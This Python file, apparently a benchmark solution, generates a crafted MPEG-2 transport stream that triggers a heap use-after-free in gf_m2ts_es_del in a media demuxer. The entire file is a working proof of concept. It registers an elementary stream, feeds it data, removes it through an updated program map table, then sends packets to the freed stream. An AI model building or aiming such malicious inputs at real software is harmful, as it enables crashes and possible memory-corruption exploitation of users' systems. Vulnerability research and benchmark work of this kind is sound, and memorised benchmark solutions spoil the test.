import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in gf_m2ts_es_del.
        The strategy is to create a valid MPEG-2 TS stream that:
        1. Sets up a Program and an Elementary Stream (ES).
        2. Sends data to the ES to allocate context/buffers.
        3. Updates the Program Map Table (PMT) to remove the ES, triggering deletion.
        4. Sends more data to the now-freed ES ID, triggering UAF.
        """
        
        def get_crc32(data):
            """Calculate MPEG-2 CRC32"""
            crc = 0xFFFFFFFF
            for b in data:
                crc ^= (b << 24)
                for _ in range(8):
                    if crc & 0x80000000:
                        crc = (crc << 1) ^ 0x04C11DB7
                    else:
                        crc <<= 1
                    crc &= 0xFFFFFFFF
            return crc

        def create_ts_packet(pid, payload, counter, pusi=0):
            """Create a 188-byte MPEG-TS packet"""
            # Header construction
            # Byte 1: Sync Byte (0x47)
            h1 = 0x47
            # Byte 2: TEI(0) | PUSI | Priority(0) | PID_High(5)
            h2 = ((pusi & 1) << 6) | ((pid >> 8) & 0x1F)
            # Byte 3: PID_Low(8)
            h3 = pid & 0xFF
            
            # Adaptation Field Control
            # We need to fill exactly 188 bytes. 
            header_size = 4
            max_payload_size = 188 - header_size
            
            # Truncate payload if necessary (shouldn't be for this PoC logic)
            curr_payload = payload[:max_payload_size]
            stuffing_needed = max_payload_size - len(curr_payload)
            
            afc = 1 # Payload only
            adaptation = b''
            
            if stuffing_needed > 0:
                afc = 3 # Adaptation Field + Payload
                # Adaptation Field: [Length] [Flags] [Stuffing...]
                # Length byte counts bytes *after* it.
                # Total AF size = 1 + Length_Val
                af_len_val = stuffing_needed - 1
                adaptation = struct.pack('B', af_len_val)
                if af_len_val > 0:
                    # Flags = 0 (Reserved/None), followed by stuffing 0xFF
                    adaptation += b'\x00'
                    if af_len_val > 1:
                        adaptation += b'\xFF' * (af_len_val - 1)
            
            # Byte 4: Scrambling(00) | AFC(2) | Counter(4)
            h4 = (0x10) | (afc << 4) | (counter & 0x0F)
            
            header = struct.pack('>BBBB', h1, h2, h3, h4)
            return header + adaptation + curr_payload

        packets = []

        # --- Packet 1: PAT (Program Association Table) ---
        # PID: 0
        # Map Program 1 to PMT PID 0x100
        pat_payload = bytearray()
        pat_payload += b'\x00' # Table ID (PAT)
        pat_payload += b'\xB0\x0D' # Section Syntax (1) + Reserved + Len(13)
        pat_payload += b'\x00\x01' # Transport Stream ID
        pat_payload += b'\xC1'     # Version 0, Current/Next 1
        pat_payload += b'\x00'     # Section Number
        pat_payload += b'\x00'     # Last Section Number
        pat_payload += b'\x00\x01\xE1\x00' # Program 1 -> PID 0x100 (0xE000 | 0x0100)
        pat_payload += struct.pack('>I', get_crc32(pat_payload))
        
        # PUSI=1 requires a pointer_field (0x00) at start of payload
        packets.append(create_ts_packet(0, b'\x00' + pat_payload, 0, pusi=1))

        # --- Packet 2: PMT (Program Map Table) Version 0 ---
        # PID: 0x100
        # Map ES PID 0x200 as AAC Audio (Type 0x0F)
        pmt0_payload = bytearray()
        pmt0_payload += b'\x02' # Table ID (PMT)
        pmt0_payload += b'\xB0\x12' # Section Len 18
        pmt0_payload += b'\x00\x01' # Program Number 1
        pmt0_payload += b'\xC1'     # Version 0, Current/Next 1
        pmt0_payload += b'\x00\x00' # Sec 0, Last 0
        pmt0_payload += b'\xE2\x00' # PCR PID 0x200
        pmt0_payload += b'\xF0\x00' # Program Info Length 0
        # Stream Loop: Type 0x0F (AAC) -> PID 0x200
        pmt0_payload += b'\x0F\xE2\x00\xF0\x00' 
        pmt0_payload += struct.pack('>I', get_crc32(pmt0_payload))
        
        packets.append(create_ts_packet(0x100, b'\x00' + pmt0_payload, 0, pusi=1))

        # --- Packet 3: ES Data (Start) ---
        # PID: 0x200
        # Start a PES packet to allocate buffer/state in the demuxer
        pes_header = b'\x00\x00\x01\xC0\x00\x00\x80\x00\x00' # Basic PES header
        es_data = pes_header + b'\xAA' * 100
        packets.append(create_ts_packet(0x200, es_data, 0, pusi=1))

        # --- Packet 4: PMT Version 1 (Update) ---
        # PID: 0x100
        # Update PMT with Version 1. Remove ES definition.
        # This causes gf_m2ts_es_del to be called for ES 0x200.
        pmt1_payload = bytearray()
        pmt1_payload += b'\x02'
        pmt1_payload += b'\xB0\x0D' # Section Len 13 (No streams)
        pmt1_payload += b'\x00\x01'
        pmt1_payload += b'\xC3'     # Version 1 (incremented), Current/Next 1
        pmt1_payload += b'\x00\x00'
        pmt1_payload += b'\xE1\xFF' # PCR PID changed or dummy
        pmt1_payload += b'\xF0\x00'
        # Empty Stream Loop
        pmt1_payload += struct.pack('>I', get_crc32(pmt1_payload))
        
        packets.append(create_ts_packet(0x100, b'\x00' + pmt1_payload, 1, pusi=1))

        # --- Packet 5: ES Data (Trigger) ---
        # PID: 0x200
        # Send more data to the deleted ES.
        # If the demuxer state wasn't cleared correctly (race or logic error), this accesses freed memory.
        packets.append(create_ts_packet(0x200, b'\xBB' * 184, 1, pusi=0))

        # --- Packet 6: Filler ---
        # PID: 0x200
        # Extra packet to match ground truth length and ensure processing.
        packets.append(create_ts_packet(0x200, b'\xCC' * 184, 2, pusi=0))

        return b''.join(packets)
